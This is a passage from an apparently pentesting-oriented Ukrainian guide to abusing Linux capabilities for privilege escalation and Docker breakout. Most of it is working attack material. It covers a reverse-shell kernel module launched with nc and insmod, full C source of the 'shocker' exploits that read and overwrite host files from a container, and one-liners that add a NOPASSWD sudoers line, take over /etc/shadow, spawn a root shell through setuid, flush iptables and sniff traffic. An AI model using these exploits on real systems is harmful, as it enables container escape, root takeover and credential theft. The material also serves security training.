obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Порожній символ перед кожним словом `make` у Makefile **має бути табуляцією, а не пробілами**!

Виконайте `make`, щоб скомпілювати його.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Насамкінець запустіть `nc` в одному shell і **завантажте модуль** з іншого — ви захопите shell у процесі nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Код цієї техніки було скопійовано з лабораторної роботи "Abusing SYS_MODULE Capability" від** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Інший приклад цієї техніки можна знайти за посиланням [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дає процесу змогу **обходити дозволи на читання файлів, а також на читання та виконання каталогів**. Основне призначення — пошук або читання файлів. Однак це також дає процесу змогу використовувати функцію `open_by_handle_at(2)`, яка може отримати доступ до будь-якого файлу, зокрема до файлів за межами mount namespace процесу. Ідентифікатор, що використовується в `open_by_handle_at(2)`, має бути непрозорим ідентифікатором, отриманим через `name_to_handle_at(2)`, але він може містити конфіденційну інформацію, наприклад номери inode, які вразливі до підроблення. Потенціал експлуатації цієї capability, особливо в контексті Docker-контейнерів, продемонстрував Sebastian Krahmer за допомогою exploit shocker, як описано [тут](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Це означає, що можна** **обійти перевірки дозволів на читання файлів і перевірки дозволів на читання/виконання каталогів.**

**Приклад із binary**

Binary зможе прочитати будь-який файл. Отже, якщо такий файл, як tar, має цю capability, він зможе прочитати файл shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Приклад із binary2**

У цьому випадку припустімо, що бінарний файл **`python`** має цю capability. Щоб переглянути список root-файлів, можна виконати:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
А щоб прочитати файл, можна виконати:
```python
print(open("/etc/shadow", "r").read())
```
**Приклад у середовищі (Docker breakout)**

Ви можете перевірити ввімкнені capabilities всередині docker-контейнера за допомогою:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
У попередньому виводі видно, що capability **DAC_READ_SEARCH** увімкнена. У результаті container може **debug processes**.

Дізнатися, як працює наведений нижче exploit, можна за посиланням [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), але коротко: **CAP_DAC_READ_SEARCH** не лише дозволяє нам переміщатися файловою системою без перевірок дозволів, а й явно скасовує будь-які перевірки для _**open_by_handle_at(2)**_ і **може дозволити нашому процесу отримувати доступ до sensitive files, відкритих іншими процесами**.

Оригінальний exploit, який зловживає цими дозволами для читання файлів із host, можна знайти тут: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c). Нижче наведено **modified version, яка дозволяє вказати файл, який потрібно прочитати, як перший аргумент і записати його вміст у файл**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Експлойт має знайти вказівник на щось, змонтоване на host. В оригінальному експлойті використовувався файл /.dockerinit, а ця модифікована версія використовує /etc/hostname. Якщо експлойт не працює, можливо, потрібно вказати інший файл. Щоб знайти файл, змонтований на host, просто виконайте команду mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Експлойт має знайти вказівник на щось, змонтоване на host. В оригінальному експлойті використовувався файл /.dockerinit, а ця модифікована версія використовує...](<../../images/image (407) (1).png>)

**Код цієї technique було скопійовано з лабораторної роботи "Abusing DAC_READ_SEARCH Capability" від** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Це означає, що ви можете обходити перевірки дозволів на запис для будь-якого файлу, тобто можете записувати в будь-який файл.**

Існує багато файлів, які можна **перезаписати для підвищення привілеїв,** [**ідеї можна знайти тут**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Приклад із binary**

У цьому прикладі vim має цю capability, тому ви можете змінити будь-який файл, наприклад _passwd_, _sudoers_ або _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Приклад із бінарним файлом 2**

У цьому прикладі бінарний файл **`python`** матиме цю capability. За допомогою python можна перезаписати будь-який файл:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Приклад із environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Ви можете перевірити увімкнені capabilities усередині docker container за допомогою:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Перш за все, прочитайте попередній розділ, який [**зловживає capability DAC_READ_SEARCH для читання довільних файлів**](linux-capabilities.md#cap_dac_read_search) хоста, і **скомпілюйте** exploit.\
Потім **скомпілюйте наведену нижче версію exploit shocker**, яка дозволить вам **записувати довільні файли** у файлову систему хоста:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Щоб **втекти** з docker container, можна **download** файли `/etc/shadow` і `/etc/passwd` з host, **add** до них **new user** і використати **`shocker_write`**, щоб перезаписати їх. Потім виконати **access** через **ssh**.

**Code цієї technique було скопійовано з лабораторної роботи "Abusing DAC_OVERRIDE Capability" на сайті** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Це означає, що можна змінити ownership будь-якого file.**

**Приклад із binary**

Припустімо, що binary **`python`** має цю capability. Тоді можна **change** **owner** файлу **`shadow`**, **change root password** і підвищити privileges:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Або з бінарним файлом **`ruby`**, який має цю capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Це означає, що можна змінювати права доступу до будь-якого файлу.**

**Приклад із binary**

Якщо python має цю capability, можна змінити права доступу до shadow-файлу, **змінити пароль root** і підвищити привілеї:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Це означає, що можна встановити ефективний ідентифікатор користувача створеного процесу.**

**Приклад із binary**

Якщо python має цю **capability**, її можна дуже легко використати для підвищення привілеїв до root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Інший спосіб:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Це означає, що можна встановити ефективний ідентифікатор групи створеного процесу.**

Існує багато файлів, які можна **перезаписати для підвищення привілеїв,** [**ідеї можна знайти тут**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Приклад із binary**

У цьому випадку слід шукати цікаві файли, доступні для читання групі, оскільки можна видати себе за будь-яку групу:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Після того як ви знайшли файл, яким можна зловживати (через читання або запис) для підвищення привілеїв, ви можете **отримати shell, що імітує потрібну групу** за допомогою:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
У цьому випадку було здійснено імперсонацію групи shadow, тому ви можете прочитати файл `/etc/shadow`:
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

Коли обидві capabilities доступні в одному helper, практичний ланцюжок має такий вигляд:

1. Змінити EGID на `shadow` (або іншу привілейовану групу).
2. Використати `chown` для `/etc/shadow`, щоб встановити свій UID, зберігши групу `shadow`.
3. Прочитати цільовий hash і виконати crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Це дозволяє уникнути прямої потреби в повних привілеях **root** і часто є достатнім для pivot через повторне використання облікових даних.

Якщо встановлено **docker**, можна **impersonate** **docker group** і зловживати ним для взаємодії з [**docker socket** та ескалації привілеїв](#writable-docker-socket).

## CAP_SETFCAP

**Це означає, що можна встановлювати capabilities для файлів і процесів**

**Приклад із binary**

Якщо python має цю **capability**, її можна дуже легко використати для ескалації привілеїв до root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Зверніть увагу: якщо ви встановите нову capability для binary за допомогою CAP_SETFCAP, ви втратите цю capability.

Щойно ви отримаєте [SETUID capability](linux-capabilities.md#cap_setuid), перейдіть до її розділу, щоб переглянути способи підвищення привілеїв.

**Приклад із середовищем (Docker breakout)**

За замовчуванням capability **CAP_SETFCAP надається process усередині container у Docker**. Це можна перевірити, виконавши щось на кшталт:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Цей capability дозволяє **надавати будь-які інші capabilities бінарним файлам**, тож ми могли б подумати про **escaping** із контейнера, **зловживаючи будь-якими іншими breakout через capabilities**, згаданими на цій сторінці.\
Однак, якщо спробувати надати, наприклад, capabilities CAP_SYS_ADMIN і CAP_SYS_PTRACE бінарному файлу gdb, ви виявите, що надати їх можна, але після цього **бінарний файл не зможе виконуватися**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[З документації](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: це **обмежувальна надмножина для effective capabilities**, які може прийняти потік. Це також обмежувальна надмножина для capabilities, які можуть бути додані потоком до успадковуваного набору, якщо цей потік **не має capability CAP_SETPCAP** у своєму effective set._\
Схоже, що Permitted capabilities обмежують capabilities, які можна використовувати.\
Однак Docker також за замовчуванням надає **CAP_SETPCAP**, тому може бути можливо **встановлювати нові capabilities у наборі успадковуваних capabilities**.\
Однак у документації щодо цієї capability зазначено: _CAP_SETPCAP : \[…] **додавати будь-яку capability з bounding set потоку, що викликає, до його успадковуваного набору**_.\
Схоже, що ми можемо додавати до успадковуваного набору лише capabilities з bounding set. Це означає, що **ми не можемо додати нові capabilities, як-от CAP_SYS_ADMIN або CAP_SYS_PTRACE, до успадковуваного набору для підвищення привілеїв**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) надає низку чутливих операцій, зокрема доступ до `/dev/mem`, `/dev/kmem` або `/proc/kcore`, зміну `mmap_min_addr`, доступ до системних викликів `ioperm(2)` і `iopl(2)`, а також виконання різних дискових команд. `FIBMAP ioctl(2)` також активується за допомогою цієї capability, що спричиняло проблеми в [минулому](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Відповідно до man page, це також дозволяє власнику описово `виконувати низку специфічних для пристрою операцій на інших пристроях`.

Це може бути корисним для **підвищення привілеїв** і **Docker breakout.**

## CAP_KILL

**Це означає, що можна завершити роботу будь-якого процесу.**

**Приклад із binary**

Припустімо, що binary **`python`** має цю capability. Якщо ви також могли б **змінити конфігурацію певного сервісу або socket** (або будь-який файл конфігурації, пов’язаний із сервісом), ви могли б додати до нього backdoor, а потім завершити процес, пов’язаний із цим сервісом, і дочекатися виконання нового файла конфігурації разом із вашим backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Якщо у вас є capabilities для kill і **node program running as root** (або від імені іншого користувача), ви, ймовірно, можете **send** йому **signal SIGUSR1**, щоб змусити його **open the node debugger**, до якого можна підключитися.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Це означає, що можна прослуховувати будь-який порт (навіть привілейовані).** Безпосередньо підвищити привілеї за допомогою цієї capability неможливо.

**Приклад із binary**

Якщо **`python`** має цю capability, він зможе прослуховувати будь-який порт і навіть підключатися з нього до будь-якого іншого порту (деякі сервіси вимагають підключень із портів із певними привілеями)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability дозволяє процесам **створювати RAW- і PACKET-сокети**, що дає їм змогу генерувати та надсилати довільні мережеві пакети. Це може створювати security-ризики в containerized environments, зокрема spoofing пакетів, ін’єкцію трафіку та обхід network access controls. Зловмисники можуть використати це для втручання в routing контейнера або компрометації network security хоста, особливо за відсутності належного firewall-захисту. Крім того, **CAP_NET_RAW** є критично важливою для privileged containers, щоб підтримувати такі операції, як ping через RAW ICMP-запити.

**Це означає, що можна перехоплювати трафік.** Безпосередньо підвищити привілеї за допомогою цієї capability неможливо.

**Приклад із бінарним файлом**

Якщо бінарний файл **`tcpdump`** має цю capability, ви зможете використовувати його для захоплення мережевої інформації.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Зверніть увагу: якщо **environment** надає цю capability, ви також можете використовувати **`tcpdump`** для sniffing трафіку.

**Приклад із binary 2**

Наведений нижче код **`python2`** може бути корисним для перехоплення трафіку інтерфейсу "**lo**" (**localhost**). Код взято з лабораторної роботи "_The Basics: CAP-NET_BIND + NET_RAW_" на [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability надає власнику можливість **змінювати мережеві конфігурації**, зокрема налаштування firewall, таблиці маршрутизації, дозволи сокетів і параметри мережевих інтерфейсів у доступних мережевих namespace. Вона також дає змогу вмикати **promiscuous mode** на мережевих інтерфейсах, що дозволяє sniffing пакетів між namespace.

**Приклад із binary**

Припустімо, що **python binary** має ці capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Це означає, що можна змінювати атрибути inode.** Безпосередньо підвищити привілеї за допомогою цієї capability неможливо.

**Приклад із binary**

Якщо ви виявите, що файл має атрибут immutable, а python має цю capability, ви можете **видалити атрибут immutable і зробити файл доступним для модифікації:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Зверніть увагу, що зазвичай цей незмінний атрибут встановлюють і видаляють за допомогою:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дає змогу виконувати системний виклик `chroot(2)`, що потенційно може дозволити вихід із середовищ `chroot(2)` через відомі вразливості:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) не лише дає змогу виконувати системний виклик `reboot(2)` для перезапуску системи, зокрема спеціальні команди на кшталт `LINUX_REBOOT_CMD_RESTART2`, призначені для певних апаратних платформ, а й дає змогу використовувати `kexec_load(2)` та, починаючи з Linux 3.17, `kexec_file_load(2)` для завантаження відповідно нових ядер або підписаних crash kernel.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) було відокремлено від ширшої можливості **CAP_SYS_ADMIN** у Linux 2.6.37, щоб безпосередньо надати можливість використовувати виклик `syslog(2)`. Ця capability дає змогу переглядати адреси ядра через `/proc` та подібні інтерфейси, коли параметр `kptr_restrict` має значення 1, яке контролює розкриття адрес ядра. Починаючи з Linux 2.6.39, значенням `kptr_restrict` за замовчуванням є 0, тобто адреси ядра відкриті, хоча багато дистрибутивів встановлюють це значення в 1 (приховувати адреси, крім випадків із uid 0) або 2 (завжди приховувати адреси) з міркувань безпеки.

Крім того, **CAP_SYSLOG** дозволяє отримувати доступ до виводу `dmesg`, коли `dmesg_restrict` має значення 1. Попри ці зміни, **CAP_SYS_ADMIN** зберігає можливість виконувати операції `syslog` через історичні причини.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) розширює функціональність системного виклику `mknod` за межі створення звичайних файлів, FIFO (іменованих каналів) або UNIX domain sockets. Зокрема, вона дозволяє створювати спеціальні файли, до яких належать:

- **S_IFCHR**: спеціальні символьні файли, тобто пристрої на кшталт терміналів.
- **S_IFBLK**: спеціальні блокові файли, тобто пристрої на кшталт дисків.

Ця capability необхідна процесам, яким потрібно створювати файли пристроїв, забезпечуючи безпосередню взаємодію з апаратним забезпеченням через символьні або блокові пристрої.

Це capability Docker за замовчуванням ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Ця capability дає змогу виконувати privilege escalation (через повне читання диска) на host за таких умов:

1. Мати початковий доступ до host (Unprivileged).
2. Мати початковий доступ до container (Privileged (EUID 0) та effective `CAP_MKNOD`).
3. Host і container мають використовувати той самий user namespace.

**Кроки для створення та доступу до блокового пристрою в container:**

1. **На host від імені стандартного користувача:**

